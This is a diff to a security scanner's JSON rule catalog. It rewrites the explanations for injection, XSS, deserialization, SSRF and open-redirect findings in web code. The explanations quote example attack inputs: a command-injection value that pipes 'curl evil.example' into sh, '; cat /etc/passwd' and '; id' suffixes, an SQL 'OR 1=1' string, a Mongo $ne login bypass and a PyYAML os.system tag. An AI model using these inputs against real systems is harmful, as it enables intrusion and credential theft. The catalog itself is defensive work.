@@ -496,7 +496,7 @@
     "description": "child_process.exec(cmd) always routes cmd through /bin/sh (or cmd.exe), so exec(\"...\" + userInput) or exec(`...${userInput}`) lets any shell metacharacter in userInput (& ; | $ ` \\n) execute attacker commands.",
     "evidence": "Source-code pattern matched for `code-cmdi-exec`.",
     "riskImpact": "Attacker-controlled input concatenated into exec() gains full shell-injection capability, leading to RCE on the host.",
-    "explanation": "The `code-cmdi-exec` check verifies that the server does not expose the `cmdi-exec` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "exec hands one string to a shell, and the shell decides where one command ends and the next begins. A value like \"a; curl evil.example | sh\" stops being data the moment it is concatenated in, and it runs as the Node process, with that account's files, environment variables and database credentials. Check first that the match really is child_process.exec, since RegExp objects have an exec method too. If it is, the response is also handing out server code, which shows attackers the exact call to aim at.",
     "fixSteps": [
       "Use execFile with an argument array instead of exec with a shell string.",
       "Validate every argument against a strict allowlist before invoking.",
@@ -1065,7 +1065,7 @@
     "description": "insertAdjacentElement splices a live DOM node into the document. When the node is built from attacker-controlled input, it bypasses HTML-string sanitizers because no HTML parsing is performed.",
     "evidence": "Source-code pattern matched for `code-xss-insertadjacentelement`.",
     "riskImpact": "Attacker-controlled DOM nodes can execute JavaScript in the page origin without HTML-parser sanitizers firing.",
-    "explanation": "The `code-xss-insertadjacentelement` check verifies that the server does not expose the `xss-insertadjacentelement` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "insertAdjacentElement takes a node that already exists, so an HTML sanitizer that works on strings never sees it. The danger is in how that node was built: an anchor whose href came from a query parameter, or an element cloned out of user-supplied markup with an onerror attribute still attached. Once inserted it runs with the page's cookies, tokens and DOM. Trace where the element is created, not where it is inserted.",
     "fixSteps": [
       "Treat any element passed to insertAdjacentElement as untrusted; build it server-side with escaping.",
       "Prefer insertAdjacentText for plain-text interpolation.",
@@ -1095,7 +1095,7 @@
     "description": "Range.createContextualFragment(fragString) parses HTML and returns a DocumentFragment. Passing user-controlled HTML directly into the fragment lets attackers inject <script> or event-handler nodes that execute immediately on insertion.",
     "evidence": "Source-code pattern matched for `code-xss-createcontextualfragment`.",
     "riskImpact": "Attacker-controlled HTML strings execute JavaScript in the page origin the moment the fragment is inserted.",
-    "explanation": "The `code-xss-createcontextualfragment` check verifies that the server does not expose the `xss-createcontextualfragment` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "This API is unusual in that it makes scripts run. A <script> inside a fragment from createContextualFragment executes when the fragment is inserted, where the same markup assigned to innerHTML stays inert. That makes it one of the more dangerous sinks to feed with anything a visitor can influence. An injected script can read whatever the page can reach, including tokens in browser storage and everything on screen.",
     "fixSteps": [
       "Sanitize the HTML string with DOMPurify before passing it to createContextualFragment.",
       "Prefer DOMParser.parseFromString with explicit text/html and sanitization.",
@@ -1124,7 +1124,7 @@
     "description": "Combining document.write with JSON.parse(userInput) reflects attacker-controlled string values straight into the document, where any <script> or on* attribute is executed before any sanitizer can intercept it.",
     "evidence": "Source-code pattern matched for `code-xss-documentwrite-jsonparse`.",
     "riskImpact": "document.write runs synchronously during parse; injected scripts execute in the page origin and persist.",
-    "explanation": "The `code-xss-documentwrite-jsonparse` check verifies that the server does not expose the `xss-documentwrite-jsonparse` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "JSON.parse gives the comfortable impression that data has been validated, but a JSON string value can hold any markup at all. Written with document.write it goes straight into the HTML parser while the page is loading, so a value such as <img src=x onerror=...> runs immediately. The usual sources are JSON from a URL fragment, from localStorage, or from an API that echoes user content.",
     "fixSteps": [
       "Never reflect parsed user JSON into document.write.",
       "Render values via textContent into a known-safe container after DOMContentLoaded.",
@@ -1151,7 +1151,7 @@
     "description": "dangerouslySetInnerHTML={{ __html: buildHtml(userInput) }} constructs the HTML string at render time from attacker-controlled parts, defeating any earlier sanitization that operated on the raw field alone.",
     "evidence": "Source-code pattern matched for `code-xss-dangerouslysetinnerhtml-dynamic`.",
     "riskImpact": "Computed or concatenated HTML strings can smuggle <script>, <iframe>, or event handlers past component-level sanitizers.",
-    "explanation": "The `code-xss-dangerouslysetinnerhtml-dynamic` check verifies that the server does not expose the `xss-dangerouslysetinnerhtml-dynamic` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "React escapes everything by default and dangerouslySetInnerHTML is the one opt-out. This check flags the case where the value is computed at render, by a function call or concatenation, so nobody can tell from the call site whether a sanitizer ran last. Sanitizing the pieces is not enough, because two harmless fragments can join into a live tag. The finished string has to be sanitized right where it is handed to React.",
     "fixSteps": [
       "Sanitize the final computed string with DOMPurify before passing it to dangerouslySetInnerHTML.",
       "Avoid string concatenation; render React components for trusted structure.",
@@ -1180,7 +1180,7 @@
     "description": "<div v-html=\"computed(userInput)\"></div> evaluates a computed expression that mixes user data into HTML; any <script> or event-handler tags are inserted verbatim.",
     "evidence": "Source-code pattern matched for `code-xss-vue-v-html-dynamic`.",
     "riskImpact": "Attacker-controlled HTML executes JavaScript in the Vue app origin.",
-    "explanation": "The `code-xss-vue-v-html-dynamic` check verifies that the server does not expose the `xss-vue-v-html-dynamic` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Vue's double-curly interpolation escapes HTML and v-html does not. An expression in the binding, rather than a plain trusted constant, means the output is assembled at render time and can include anything its inputs contain. Injected markup runs in the app's origin with access to its state and any token kept in browser storage. Vue's own documentation says to use v-html only on trusted content, never on user-provided content.",
     "fixSteps": [
       "Sanitize the computed string with DOMPurify before binding to v-html.",
       "Use Mustache interpolation {{ value }} unless the HTML is provably safe.",
@@ -1207,7 +1207,7 @@
     "description": "Calling bypassSecurityTrustHtml(userInput) or bypassSecurityTrustScript(userInput) tells Angular the value is safe, completely defeating its built-in DomSanitizer.",
     "evidence": "Source-code pattern matched for `code-xss-angular-bypass-dynamic`.",
     "riskImpact": "Attacker-controlled HTML or URL is rendered as-is, enabling stored XSS or javascript: navigation.",
-    "explanation": "The `code-xss-angular-bypass-dynamic` check verifies that the server does not expose the `xss-angular-bypass-dynamic` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Angular sanitizes bound values by default, and the bypassSecurityTrust methods are how code tells it to stop. Each call is a promise that a person checked the value. When the argument is derived from input nobody did, and Angular renders it unchanged: HTML can carry event handlers and a URL can be javascript:. Searching the codebase for these calls should return a short list of constants, and anything else on that list needs a sanitizer in front of it.",
     "fixSteps": [
       "Sanitize the value with DomSanitizer.sanitize(SecurityContext.HTML, ...) before trusting it.",
       "Avoid passing user input directly into bypassSecurityTrust* APIs.",
@@ -1234,7 +1234,7 @@
     "description": "new DOMParser().parseFromString(userInput, 'text/html') parses arbitrary HTML into a Document. Subsequent node import via adoptNode or document.importNode preserves <script> elements, which can execute when reattached.",
     "evidence": "Source-code pattern matched for `code-xss-domparser-parsefromstring`.",
     "riskImpact": "Scripts parsed via DOMParser can survive adoption into the host document and execute.",
-    "explanation": "The `code-xss-domparser-parsefromstring` check verifies that the server does not expose the `xss-domparser-parsefromstring` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "parseFromString on its own is safe: nothing runs inside the parsed document, which is why it is often used to inspect HTML. The risk starts when nodes leave that inert document. Code that imports them into the live page, or reads innerHTML back out and assigns it elsewhere, carries event-handler attributes along, and those fire once the element is live. Confirm whether any parsed node, or its serialized HTML, ever reaches the real DOM.",
     "fixSteps": [
       "Sanitize the parsed result with DOMPurify before adopting any nodes.",
       "Strip <script> elements after parseFromString.",
@@ -1263,7 +1263,7 @@
     "description": "spawn(cmd, { shell: true }) or spawn(\"sh -c \" + cmd) re-routes the command through /bin/sh, so any unescaped metacharacter in arguments (& ; | $ ` \\n) executes attacker commands.",
     "evidence": "Source-code pattern matched for `code-cmdi-spawn-shell-true`.",
     "riskImpact": "Attacker-controlled arguments gain full shell-injection capability, leading to RCE on the host.",
-    "explanation": "The `code-cmdi-spawn-shell-true` check verifies that the server does not expose the `cmdi-spawn-shell-true` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "spawn is the safe way to start a process because each argument stays a separate value. shell: true throws that away: Node joins the arguments into one string and gives it to a shell, so a single semicolon or a $(...) in any argument starts a new command. The option is often added for Windows .cmd support or for globs and then left in place. The command runs with the Node process's credentials and file access.",
     "fixSteps": [
       "Pass args as a separate array; spawn with shell:false and let Node escape them.",
       "Validate every argument against a strict allowlist before invoking.",
@@ -1289,10 +1289,10 @@
     "title": "os.exec / os.system / os.popen usage",
     "category": "code",
     "severity": "critical",
-    "description": "Python's os.system, os.exec*, and os.popen pass their string argument to the shell. Any user-controlled portion executes as a shell command.",
+    "description": "Python's os.system and os.popen pass their string to the shell, and os.exec* replaces the process with whatever program and arguments it is given. Any user-controlled portion decides what runs.",
     "evidence": "Source-code pattern matched for `code-cmdi-os-exec`.",
     "riskImpact": "Attacker can chain arbitrary shell commands and read or destroy server files.",
-    "explanation": "The `code-cmdi-os-exec` check verifies that the server does not expose the `cmdi-os-exec` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "os.system and os.popen hand a single string to /bin/sh, so anything concatenated into it can contain shell syntax: a filename of \"x; cat /etc/passwd\" is enough. The os.exec family has no shell, but it is still dangerous when input picks the program or its flags. Whatever runs keeps the web app's user, files and secrets, so the first things an attacker reads are environment variables and application config.",
     "fixSteps": [
       "Use subprocess.run([...], shell=False) with argument arrays.",
       "Validate inputs against an allowlist of permitted values.",
@@ -1319,7 +1319,7 @@
     "description": "Patterns like os.system(\"/bin/sh -c '\" + userInput + \"'\") or exec(\"sh -c \" + userInput) build a shell command via concatenation or interpolation, embedding attacker input into a parsed shell string.",
     "evidence": "Source-code pattern matched for `code-cmdi-bin-sh-concat`.",
     "riskImpact": "Concatenated shell strings let attackers break out of quotes and execute arbitrary commands.",
-    "explanation": "The `code-cmdi-bin-sh-concat` check verifies that the server does not expose the `cmdi-bin-sh-concat` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Calling sh -c with a built string means the shell parses your quoting and the attacker's input together. Wrapping the value in single quotes does not help, because a single quote in the input closes yours and whatever follows runs as a command. Code like this usually reached for a shell to get pipes or redirects, and each of those can be done in the host language without one.",
     "fixSteps": [
       "Eliminate the shell entirely: use execve, subprocess.run(args), or Node's spawn with an arg array.",
       "If a shell is mandatory, use shlex.quote or equivalent escaping on every variable.",
@@ -1346,7 +1346,7 @@
     "description": "subprocess.Popen(builtString, shell=True) and os.popen(builtString) both run their input through a shell. Even partial user influence over arguments enables command injection via metacharacters.",
     "evidence": "Source-code pattern matched for `code-cmdi-popen`.",
     "riskImpact": "Shell injection through Popen/popen gives the attacker a shell on the host.",
-    "explanation": "The `code-cmdi-popen` check verifies that the server does not expose the `cmdi-popen` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "subprocess.Popen is safe with a list of arguments and unsafe the moment shell=True meets a formatted string, because /bin/sh then parses the result. os.popen has no list form at all and always uses a shell. The classic case is a value placed into an otherwise fixed command, such as a hostname for ping: \"8.8.8.8; id\" runs both. Output often goes back to the caller, which makes reading files easy.",
     "fixSteps": [
       "Always pass shell=False and an args list to Popen.",
       "Run untrusted input through shlex.quote before any shell-escape necessity.",
@@ -1375,7 +1375,7 @@
     "description": "spawn(\"git \" + userArg) or execFile(`tool ${userArg}`) builds an argument string via concatenation. Although execFile itself does not invoke a shell, the embedded space allows attackers to inject additional flags or arguments.",
     "evidence": "Source-code pattern matched for `code-cmdi-process-spawn`.",
     "riskImpact": "Argument injection lets attackers invoke unintended subcommands, read arbitrary files, or trigger built-in shell escapes.",
-    "explanation": "The `code-cmdi-process-spawn` check verifies that the server does not expose the `cmdi-process-spawn` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "execFile and spawn only avoid a shell when the program and each argument are passed separately. Code that builds one command string has to split it on spaces or enable a shell to make it work, and then input can add its own flags: --upload-pack on git, -o on a compiler. That is argument injection, where the program is yours and the options are the attacker's, and it reaches file writes or code execution without a single shell metacharacter.",
     "fixSteps": [
       "Pass user input as a discrete array element: spawn(cmd, [userArg]).",
       "Allowlist each argument value before passing to execFile.",
@@ -1404,7 +1404,7 @@
     "description": "MongoDB queries of the form { $where: \"this.field == '\" + userInput + \"'\" } or { $where: Function(\"return this.x == '\" + userInput + \"'\") } embed user input into JavaScript that runs server-side on every document in the collection.",
     "evidence": "Source-code pattern matched for `code-sqli-mongodb-where`.",
     "riskImpact": "Attacker can run arbitrary JavaScript on the MongoDB server, leaking documents and bypassing authentication.",
-    "explanation": "The `code-sqli-mongodb-where` check verifies that the server does not expose the `sqli-mongodb-where` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "$where is the MongoDB operator that executes JavaScript inside the database, once per document. A value concatenated into it is code, so \"' || true || '\" returns the whole collection and a sleep() call gives a timing oracle for reading fields one character at a time. Standard operators such as $eq take typed values and offer nothing to escape from, which is why $where should not appear near request data at all.",
     "fixSteps": [
       "Avoid $where entirely; use standard query operators with typed values.",
       "If aggregation is required, prefer $expr with sanitized expressions.",
@@ -1433,7 +1433,7 @@
     "description": "Building a MongoDB query with { field: { $regex: userInput } } or new RegExp(userInput) lets attackers supply patterns that match every document (.*) or trigger catastrophic backtracking, leaking data or causing DoS.",
     "evidence": "Source-code pattern matched for `code-sqli-mongodb-regex`.",
     "riskImpact": "Wildcard or pathological regex patterns expose every document or stall the server.",
-    "explanation": "The `code-sqli-mongodb-regex` check verifies that the server does not expose the `sqli-mongodb-regex` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A $regex built from input has two separate problems. Sending .* matches everything the filter was meant to narrow, which turns a lookup by name or email into a dump of the collection. A nested quantifier such as (a+)+$ makes the database burn CPU on each document, so one request can slow every other query on that server. Escaping the input turns the pattern back into literal text and closes both.",
     "fixSteps": [
       "Escape regex metacharacters before compiling user input with RegExp.",
       "Anchor patterns with ^ and bound their length; reject unbounded inputs.",
@@ -1462,7 +1462,7 @@
     "description": "db.query(\"SELECT * FROM users WHERE id = '\" + userId + \"'\") or knex.raw(`SELECT * FROM x WHERE id = ${userId}`) build a SQL string from user input, enabling classic SQL injection.",
     "evidence": "Source-code pattern matched for `code-sqli-raw-query-string`.",
     "riskImpact": "Classic SQL injection: data exfiltration, authentication bypass, and potentially full RCE on the database server.",
-    "explanation": "The `code-sqli-raw-query-string` check verifies that the server does not expose the `sqli-raw-query-string` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Concatenation puts a value into the SQL text before the database has parsed it, so a quote in the value ends the string and the rest is read as SQL. \"' OR 1=1 --\" gets past a login check, and a UNION SELECT returns rows from any table the connection can read: password hashes, tokens, other customers' records. With a placeholder the statement is parsed first, and the value can never become syntax.",
     "fixSteps": [
       "Use parameterized queries or prepared statements with placeholders.",
       "Replace knex.raw with knex('table').where({ id: userId }).",
@@ -1489,7 +1489,7 @@
     "description": "Tag-less template literals like pool.query(`SELECT * FROM t WHERE id = ${id}`) interpolate user input directly into SQL text. Tagged sql`` libraries are safe; bare backticks are not.",
     "evidence": "Source-code pattern matched for `code-sqli-template-literal-query`.",
     "riskImpact": "Template-literal SQL injection exposes all rows the caller can see and can pivot to RCE on the database host.",
-    "explanation": "The `code-sqli-template-literal-query` check verifies that the server does not expose the `sqli-template-literal-query` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A backtick string looks like a parameterized query and behaves like concatenation: JavaScript fills in the value before the driver sees anything, so pool.query receives one finished string. It reads as tidy code and survives reviews for that reason. Only a tagged template, such as the sql helper in postgres.js or Prisma's $queryRaw, receives the parts separately and can turn them into bind parameters.",
     "fixSteps": [
       "Switch to a tagged template SQL helper (sql`...`) that auto-parameterizes.",
       "Or use placeholders: pool.query('SELECT * FROM t WHERE id = $1', [id]).",
@@ -1516,7 +1516,7 @@
     "description": "Model.find(JSON.parse(req.body)) passes a user-supplied object directly into a Mongo query. Attackers can inject query operators like $where, $regex, or $ne to bypass access control.",
     "evidence": "Source-code pattern matched for `code-sqli-mongoose-find-user`.",
     "riskImpact": "Attacker injects NoSQL operators to bypass filters, leak other users' documents, or trigger $where JavaScript.",
-    "explanation": "The `code-sqli-mongoose-find-user` check verifies that the server does not expose the `sqli-mongoose-find-user` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Passing a parsed request body to find() lets the client write the query rather than fill in a value. { \"password\": { \"$ne\": null } } matches every account, and a login that runs findOne on the submitted fields accepts that as a correct password. Express body parsers build these nested objects from ordinary form fields too, so this is not limited to JSON APIs. Cast each field to the type you expect before it reaches the query.",
     "fixSteps": [
       "Use an explicit schema (Joi/Zod) to strip unknown keys before reaching find().",
       "Apply express-mongo-sanitize or mongo-sanitize to remove $-prefixed operators.",
@@ -1543,7 +1543,7 @@
     "description": "Sequelize.literal(userInput) or Sequelize.fn('CONCAT', userInput, 'x') interpolates raw SQL. When the literal contains user data, the resulting WHERE clause is vulnerable to SQL injection.",
     "evidence": "Source-code pattern matched for `code-sqli-sequelize-literal`.",
     "riskImpact": "SQL injection via Sequelize.literal breaks parameterized query boundaries and can exfiltrate the entire database.",
-    "explanation": "The `code-sqli-sequelize-literal` check verifies that the server does not expose the `sqli-sequelize-literal` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Sequelize parameterizes ordinary where clauses, and Sequelize.literal exists to opt out: its argument is pasted into the SQL as written, so anything dynamic inside it is injectable even though the rest of the query looks like safe ORM code. It is commonly reached for in ORDER BY, where bind parameters cannot stand in for column names. That case needs an allowlist of column names, not escaping.",
     "fixSteps": [
       "Use Sequelize replacements: { replacements: [userInput] } instead of literal().",
       "Allowlist column or operator names before passing to literal().",
@@ -1570,7 +1570,7 @@
     "description": "yaml.load(input) uses the unsafe Loader by default and instantiates arbitrary Python objects via !!python/object tags. yaml.safe_load rejects those tags.",
     "evidence": "Source-code pattern matched for `code-deser-yaml-load`.",
     "riskImpact": "Crafted YAML can execute arbitrary Python during parsing, leading to full RCE on the host.",
-    "explanation": "The `code-deser-yaml-load` check verifies that the server does not expose the `deser-yaml-load` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "YAML tags can ask the parser to construct objects, and PyYAML's full loader honors tags such as !!python/object/apply:os.system, which calls the function while the document is being parsed. Validating the result afterwards is too late, because the code already ran. PyYAML 6 made the Loader argument mandatory to force this choice, but yaml.load(data, Loader=yaml.Loader) and older installs are still dangerous.",
     "fixSteps": [
       "Use yaml.safe_load(input) for any untrusted YAML.",
       "Or pin a safe Loader: yaml.load(input, Loader=yaml.SafeLoader).",
@@ -1597,7 +1597,7 @@
     "description": "pickle.loads(untrusted_bytes) reconstructs arbitrary Python objects and executes their __reduce__ method. Crafted pickles achieve arbitrary code execution at parse time.",
     "evidence": "Source-code pattern matched for `code-deser-pickle-loads`.",
     "riskImpact": "Untrusted pickle data triggers arbitrary code execution in the Python interpreter.",
-    "explanation": "The `code-deser-pickle-loads` check verifies that the server does not expose the `deser-pickle-loads` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "A pickle is a small program for a stack machine rather than a data format. Its REDUCE opcode calls any importable function with any arguments, so a crafted payload simply says to call os.system with a given string, and pickle.loads does that before your code sees a result. Python's own documentation warns never to unpickle untrusted data. The usual exposure is a cookie, a cache value in a shared Redis, or an uploaded model file.",
     "fixSteps": [
       "Never unpickle data from untrusted sources; use JSON or msgpack instead.",
       "If unavoidable, verify an HMAC signature on the pickled bytes before loading.",
@@ -1624,7 +1624,7 @@
     "description": "Patterns like eval(atob(payload)) or eval(Buffer.from(payload,'base64').toString()) decode and immediately execute attacker-supplied JavaScript. The base64 layer adds nothing; eval still runs the result.",
     "evidence": "Source-code pattern matched for `code-deser-base64-eval`.",
     "riskImpact": "Encoded eval() bypasses naive content filters and runs arbitrary JavaScript in the page or server.",
-    "explanation": "The `code-deser-base64-eval` check verifies that the server does not expose the `deser-base64-eval` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Base64 and eval together are the signature of either a loader someone wrote in a hurry or a payload someone else planted, and the first thing to find out is which. Legitimate code rarely needs this. If the string arrives from a request or from storage, it is remote code execution in the browser or on the server. If it is hardcoded in a file you did not write, treat the site as possibly compromised and decode it to see what it does.",
     "fixSteps": [
       "Remove eval entirely; decode with atob only if you need data, then JSON.parse.",
       "Use a sandboxed interpreter like vm2 with strict context if you must run untrusted code.",
@@ -1651,7 +1651,7 @@
     "description": "new Function('return ' + JSON.parse(input)) or new Function(JSON.parse(input).body) constructs a function body from parsed JSON. The parsed JSON still ships attacker-controlled source code.",
     "evidence": "Source-code pattern matched for `code-deser-jsonparse-newfunction`.",
     "riskImpact": "Function constructor evaluates attacker-controlled source, enabling arbitrary code execution.",
-    "explanation": "The `code-deser-jsonparse-newfunction` check verifies that the server does not expose the `deser-jsonparse-newfunction` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "new Function compiles a string into code just as eval does. Running the string through JSON.parse first only proves it was valid JSON, and a JSON string can hold any source text at all. This tends to appear in formula features, rule engines and plugin systems that store logic as data. Whoever can write that data can then run code in whichever process evaluates it, browser or server.",
     "fixSteps": [
       "Avoid new Function for untrusted input; use real functions or modules.",
       "If dynamic logic is required, evaluate it through a safe DSL like JSONLogic.",
@@ -1680,7 +1680,7 @@
     "description": "node-serializes serialize/deserialize supports an IIFE payload (rce: _$ND_FUNC$$ = function(){...}()). The deserialize() call evaluates that payload and executes attacker JavaScript on the server.",
     "evidence": "Source-code pattern matched for `code-deser-node-serialize`.",
     "riskImpact": "Untrusted serialized input is evaluated, leading directly to remote code execution.",
-    "explanation": "The `code-deser-node-serialize` check verifies that the server does not expose the `deser-node-serialize` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "node-serialize writes functions as strings with a _$ND_FUNC$$_ prefix and restores them with eval. Adding () to the end of such a string makes it run during deserialize. This is CVE-2017-5941, public exploits exist, and all they need is a cookie or body field that the app passes to the library. No patched release exists to upgrade to, so the package has to go.",
     "fixSteps": [
       "Replace node-serialize with JSON.parse; node-serialize is unmaintained and unsafe.",
       "Validate any unserialized data with a strict schema (Zod, Joi).",
@@ -1707,7 +1707,7 @@
     "description": "unserialize($_COOKIE['x']) or unserialize($request->body) can trigger __wakeup, __destruct, or other magic methods on attacker-chosen classes, leading to RCE via POP gadget chains.",
     "evidence": "Source-code pattern matched for `code-deser-php-unserialize`.",
     "riskImpact": "Object injection via PHP unserialize enables property-oriented programming chains and remote code execution.",
-    "explanation": "The `code-deser-php-unserialize` check verifies that the server does not expose the `deser-php-unserialize` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "unserialize builds objects of any class the application can autoload, and PHP then calls their magic methods: __wakeup on creation, __destruct when they go out of scope. Attackers do not need to inject code. They chain existing classes from frameworks and Composer packages, which is what tools like PHPGGC automate. A cookie or hidden field fed to unserialize is often all it takes for remote code execution.",
     "fixSteps": [
       "Use json_decode for any untrusted data instead of unserialize.",
       "If serialization is required, pass ['allowed_classes' => false] as the second argument.",
@@ -1734,7 +1734,7 @@
     "description": "fetch(\"http://127.0.0.1:8080/...\"), fetch(\"http://[::1]:...\"), or fetch(\"http://169.254.169.254/...\") target loopback or cloud metadata endpoints. When the URL is even partially user-controlled, the request can be redirected to internal services.",
     "evidence": "Source-code pattern matched for `code-ssrf-fetch-port`.",
     "riskImpact": "Attacker reaches internal services such as admin panels, databases, or cloud metadata APIs.",
-    "explanation": "The `code-ssrf-fetch-port` check verifies that the server does not expose the `ssrf-fetch-port` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "The match is a fetch to a literal loopback, private or metadata address, including 169.254.169.254, where cloud instances hand out their credentials. In browser code this is usually a leftover development URL that does nothing for visitors except reveal internal hosts and ports. In server code that leaked into a response it is a map of what the server can reach and, if any part of the URL can be influenced, a route to it.",
     "fixSteps": [
       "Resolve the destination hostname and reject private/loopback/link-local ranges before fetching.",
       "Use an outbound HTTP proxy that enforces an allowlist of external hosts.",
@@ -1763,7 +1763,7 @@
     "description": "fetch(req.query.url) or fetch(`https://api.example.com/${userPath}`) lets attackers redirect the request to internal hosts (http://localhost, http://169.254.169.254) or arbitrary external services.",
     "evidence": "Source-code pattern matched for `code-ssrf-fetch-user-input`.",
     "riskImpact": "Server-side request forgery to internal services, cloud metadata endpoints, or other external systems.",
-    "explanation": "The `code-ssrf-fetch-user-input` check verifies that the server does not expose the `ssrf-fetch-user-input` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "The server makes this request, so it leaves from inside your network. Point it at http://169.254.169.254/ and a cloud instance can return temporary IAM credentials; point it at localhost and admin ports that were never meant to be public answer. A fixed hostname prefix can still be escaped with a redirect or a crafted path. Checking the string once is not enough either, since DNS can change between validation and connection.",
     "fixSteps": [
       "Build URLs from server-side allowlists, not from raw user input.",
       "Resolve the host and reject private/loopback IP ranges before issuing the fetch.",
@@ -1792,7 +1792,7 @@
     "description": "axios.get(req.body.url) or axios({ url: `https://api/${userId}` }) issues HTTP from the server with attacker-controlled destinations, enabling SSRF and credential theft from metadata endpoints.",
     "evidence": "Source-code pattern matched for `code-ssrf-axios-user-input`.",
     "riskImpact": "Outbound requests reach internal services or cloud metadata APIs that the attacker cannot otherwise reach.",
-    "explanation": "The `code-ssrf-axios-user-input` check verifies that the server does not expose the `ssrf-axios-user-input` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "axios follows redirects by default, so an allowed URL that answers with a 302 can still send the request to an internal address unless each hop is checked. It also sends any default headers configured on the instance, which can hand your Authorization header to whatever host the attacker named. Error messages that include the response body turn blind SSRF into a way to read internal pages.",
     "fixSteps": [
       "Validate the URL against an allowlist of permitted hosts and paths.",
       "Resolve the host and block private IP ranges (RFC 1918, loopback, link-local).",
@@ -1819,7 +1819,7 @@
     "description": "xhr.open(\"GET\", userInput) or fetch via XHR with a user-supplied URL allows attackers to drive requests to arbitrary hosts when called server-side (e.g. in Node + jsdom or in service workers).",
     "evidence": "Source-code pattern matched for `code-ssrf-xhr-user-input`.",
     "riskImpact": "Server-side XHR can reach internal services or leak response contents through error messages.",
-    "explanation": "The `code-ssrf-xhr-user-input` check verifies that the server does not expose the `ssrf-xhr-user-input` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "Browsers constrain XMLHttpRequest with the same-origin policy, so the concern is the other environments that provide it: server-side rendering through jsdom, Electron, and polyfills such as xhr2. In those there is no origin to enforce and the request goes out with the process's network access. In pure browser code, a caller-chosen URL is still a way to send the page's data to someone else's host.",
     "fixSteps": [
       "Restrict XHR destinations to an allowlist of trusted hosts.",
       "Resolve the URL host and reject private IP ranges.",
@@ -1848,7 +1848,7 @@
     "description": "got(req.query.url), undici.fetch(userUrl), or node-fetch(requestUrl) perform HTTP from the server process. Without URL allowlisting, attackers route requests to internal infrastructure.",
     "evidence": "Source-code pattern matched for `code-ssrf-got-user-input`.",
     "riskImpact": "SSRF via popular HTTP clients exposes internal services and cloud metadata endpoints.",
-    "explanation": "The `code-ssrf-got-user-input` check verifies that the server does not expose the `ssrf-got-user-input` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "These Node clients have no concept of an internal address, and their defaults make it worse: got follows redirects and retries failed requests, so one attacker-chosen URL can produce several probes of your network. DNS rebinding also defeats a hostname check done once before the call. Validate the resolved address at connection time with a custom agent or lookup function, or send outbound traffic through an egress proxy.",
     "fixSteps": [
       "Validate the URL against an allowlist of permitted hosts and ports.",
       "Resolve the hostname and reject loopback / RFC1918 / link-local addresses.",
@@ -1875,7 +1875,7 @@
     "description": "Assigning window.location.href to a user-supplied URL performs a top-level navigation to the attacker-chosen host, enabling phishing and credential theft via open redirect.",
     "evidence": "Source-code pattern matched for `code-redirect-window-location-href`.",
     "riskImpact": "Attacker hosts a convincing phishing page at the destination and uses the open redirect as the launchpad.",
-    "explanation": "The `code-redirect-window-location-href` check verifies that the server does not expose the `redirect-window-location-href` weakness in the code category. The detection runs against the response headers, body, or auxiliary probes (DNS, TLS, async fetch) as appropriate.",
+    "explanation": "The link a victim sees and trusts points at your domain, and your page sends them elsewhere. Phishing uses this to borrow a real domain's reputation and to get past mail filters. A value of javascript:... assigned to location.href also runs as script in your origin, so the same line is DOM XSS. Checking that the string starts with / is not enough, because //evil.example is a valid absolute URL.",
     "fixSteps": [
